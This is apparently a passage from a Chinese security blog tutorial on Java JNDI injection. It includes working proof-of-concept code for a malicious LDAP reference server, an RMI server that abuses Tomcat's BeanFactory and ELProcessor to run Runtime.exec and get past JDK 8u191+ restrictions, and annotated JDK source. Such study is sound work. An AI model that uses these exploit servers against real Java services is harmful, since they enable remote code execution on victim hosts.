<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为false</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LDAPServer</span></span><br><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LDAPServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argsx)</span> </span>&#123;</span><br><span class="line">        String[] args = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;http://192.168.2.37:3000/#ExecTest&quot;</span>, <span class="string">&quot;9999&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">1</span> || args[<span class="number">0</span>].indexOf(<span class="string">&#x27;#&#x27;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.err.println(LDAPServer.class.getSimpleName() + <span class="string">&quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(args[<span class="number">0</span>])));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span><span class="params">(URL cb)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refPos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JNDIClient</span></span><br><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;ldap://127.0.0.1:9999/ExecTest&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>客户端分析：</p>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220525103329995.png" alt="image-20220525103329995"></p>
<ol>
<li>LdapCtx这个地方才是真正的LDAP解析</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jndi.ldap.LdapCtx#c_lookup</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">c_lookup</span><span class="params">(Name name, Continuation cont)</span></span></span><br><span class="line"><span class="function">           <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       cont.setError(<span class="keyword">this</span>, name);</span><br><span class="line">       Object obj = <span class="keyword">null</span>;</span><br><span class="line">       Attributes attrs;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           SearchControls cons = <span class="keyword">new</span> SearchControls();</span><br><span class="line">           cons.setSearchScope(SearchControls.OBJECT_SCOPE);</span><br><span class="line">           cons.setReturningAttributes(<span class="keyword">null</span>); <span class="comment">// ask for all attributes</span></span><br><span class="line">           cons.setReturningObjFlag(<span class="keyword">true</span>); <span class="comment">// need values to construct obj</span></span><br><span class="line">					</span><br><span class="line">         	<span class="comment">// 去LDAP获得类属性</span></span><br><span class="line">           LdapResult answer = doSearchOnce(name, <span class="string">&quot;(objectClass=*)&quot;</span>, cons, <span class="keyword">true</span>);</span><br><span class="line">           respCtls = answer.resControls; <span class="comment">// retrieve response controls</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">// should get back 1 SearchResponse and 1 SearchResult</span></span><br><span class="line">					<span class="comment">// 判断是否搜索成功</span></span><br><span class="line">           <span class="keyword">if</span> (answer.status != LdapClient.LDAP_SUCCESS) &#123;</span><br><span class="line">               processReturnCode(answer, name);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (answer.entries == <span class="keyword">null</span> || answer.entries.size() != <span class="number">1</span>) &#123;</span><br><span class="line">               <span class="comment">// found it but got no attributes</span></span><br><span class="line">               attrs = <span class="keyword">new</span> BasicAttributes(LdapClient.caseIgnore);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               LdapEntry entry = answer.entries.elementAt(<span class="number">0</span>);</span><br><span class="line">               attrs = entry.attributes;</span><br><span class="line"></span><br><span class="line">               Vector&lt;Control&gt; entryCtls = entry.respCtls; <span class="comment">// retrieve entry controls</span></span><br><span class="line">               <span class="keyword">if</span> (entryCtls != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   appendVector(respCtls, entryCtls); <span class="comment">// concatenate controls</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">					</span><br><span class="line">         	<span class="comment">// Obj.CLASSNAME = 2 , Obj.JAVA_ATTRIBUTES[2] = javaClassName</span></span><br><span class="line">         	<span class="comment">// 在判断从LDAP有没有取回来javaClassName 这个属性</span></span><br><span class="line">           <span class="keyword">if</span> (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">             	<span class="comment">// 序列化对象或者引用</span></span><br><span class="line">               <span class="comment">// serialized object or object reference</span></span><br><span class="line">               obj = Obj.decodeObject(attrs);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">               obj = <span class="keyword">new</span> LdapCtx(<span class="keyword">this</span>, fullyQualifiedName(name));</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220525102832684.png" alt="image-20220525102832684"></p>
<ol start="2">
<li>在decodeObject时与RMI Refrence有所不同，后面都大同小异了，如果是远程reference就去加载解析。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jndi.ldap.Obj  </span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> Object <span class="title">decodeObject</span><span class="params">(Attributes var0)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="number">4</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Attribute var1;</span><br><span class="line">          	<span class="comment">// 直接反序列化类</span></span><br><span class="line">            <span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">1</span>])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                ClassLoader var3 = helper.getURLClassLoader(var2);</span><br><span class="line">                <span class="keyword">return</span> deserializeObject((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])var1.get()), var3);</span><br><span class="line">            <span class="comment">// 这是去加载RMI吗</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">7</span>])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="number">2</span>]).get(), (String)var1.get(), var2);</span><br><span class="line">            <span class="comment">// 远程引用类，这里会调用decodeReference</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> var1 == <span class="keyword">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="number">2</span>]) ? <span class="keyword">null</span> : decodeReference(var0, var2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var5);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220524230943855.png" alt="image-20220524230943855"></p>
<h1 id="0x3-绕过JDK-8u191-等高版本限制"><a href="#0x3-绕过JDK-8u191-等高版本限制" class="headerlink" title="0x3. 绕过JDK 8u191+等高版本限制"></a>0x3. 绕过JDK 8u191+等高版本限制</h1><p>所以对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
<li>JRMP：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd">空指针-treasure-Writeup</a></li>
</ol>
<p> 这三种方式都依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p>
<h2 id="0x3-1-Local-Refrence-Factory"><a href="#0x3-1-Local-Refrence-Factory" class="headerlink" title="0x3.1 Local Refrence Factory"></a>0x3.1 Local Refrence Factory</h2><p>使用本地工厂类去创建任意对象。</p>
<h2 id="0x3-1-1-Tomcat-BeanFactory"><a href="#0x3-1-1-Tomcat-BeanFactory" class="headerlink" title="0x3.1.1 Tomcat  BeanFactory"></a>0x3.1.1 Tomcat  BeanFactory</h2><p>POC:</p>
<p>POM依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIServer</span></span><br><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;ExecTest&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JDNIClient</span></span><br><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/ExecTest&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JDK8u332</p>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220526130933959.png" alt="image-20220526130933959"></p>
<p>在分析计算器如何弹出来之前研究下这是什么，这个ResourceRef 是什么：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>



<p>一些相关的类：</p>
<ul>
<li>Refrence ， 在Naming/Directory中的引用，由 一堆地址 和 被引用对象的类信息组成，地址用来标识如何去找这个类，类的信息包括类名、创建这个类的工厂类名、工厂类的引用</li>
</ul>
<blockquote>
<p>This class represents a reference to an object that is found outside of the naming/directory system.<br>Reference provides a way of recording address information about objects which themselves are not directly bound to the naming/directory system.<br>A Reference consists of an ordered list of addresses and class information about the object being referenced. Each address in the list identifies a communications endpoint for the same conceptual object. The “communications endpoint” is information that indicates how to contact the object. It could be, for example, a network address, a location in memory on the local machine, another process on the same machine, etc. The order of the addresses in the list may be of significance to object factories that interpret the reference.<br>Multiple addresses may arise for various reasons, such as replication or the object offering interfaces over more than one communication mechanism. The addresses are indexed starting with zero.<br>A Reference also contains information to assist in creating an instance of the object to which this Reference refers. It contains the class name of that object, and the class name and location of the factory to be used to create the object. The class factory location is a space-separated list of URLs representing the class path used to load the factory. When the factory class (or any class or resource upon which it depends) needs to be loaded, each URL is used (in order) to attempt to load the class.<br>A Reference instance is not synchronized against concurrent access by multiple threads. Threads that need to access a single Reference concurrently should synchronize amongst themselves and provide the necessary locking.</p>
<p>Since:<br>1.3<br>See Also:<br>RefAddr, StringRefAddr, BinaryRefAddr<br>Author:<br>Rosanna Lee, Scott Seligman</p>
</blockquote>
<ul>
<li>RefAddr, StringRefAddr, BinaryRefAddr ， 这几个类都是描述如何去连接对方的类。</li>
<li>ResourceRef，这其实就是Reference的子类</li>
</ul>
